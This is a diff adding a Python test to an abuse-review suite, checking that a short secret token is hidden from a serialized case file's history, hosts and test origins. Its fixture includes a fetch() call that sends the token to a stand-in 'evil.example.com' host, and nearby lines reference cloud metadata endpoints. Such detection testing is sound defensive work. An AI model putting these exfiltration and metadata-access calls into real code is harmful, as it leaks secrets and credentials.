@@ -352,6 +352,28 @@ class TestAbuseReview(AbuseClassificationTestCase):
 
         assert case["history"][-1]["hosts"] == ["metadata.google.internal"]
 
+    def test_a_short_secret_token_is_hidden_from_history_hosts_and_test_origins(self) -> None:
+        token = "ab12cd34"
+        destination = self.create_destination(
+            hog="return event",
+            inputs_schema=[{"key": "hook", "type": "string", "label": "Hook", "secret": True}],
+            inputs={"hook": {"value": f"https://{token}.ngrok.example.com/hook"}},
+            mappings=[],
+            masking=None,
+        )
+        old_code = f"fetch('http://{token}@evil.example.com/');fetch('https://{token}.relay.example.com/x')"
+        self.log(destination, "updated", changes=[{"field": "hog", "after": old_code}])
+        self.log(
+            destination,
+            "tested",
+            context={"hog": "fetch(inputs.hook)", "request_origins": [f"https://{token}.ngrok.example.com"]},
+        )
+
+        serialized = build_case_file(destination, score(destination)).to_json()
+
+        assert token not in serialized
+        assert "relay.example.com" in serialized
+
     def test_a_long_config_with_a_long_history_keeps_its_hosts(self) -> None:
         padding = " ".join(f"w{index}" for index in range(12_000))
         destination = self.create_destination(hog=f"fetch('http://169.254.169.254/latest');\n// {padding}")
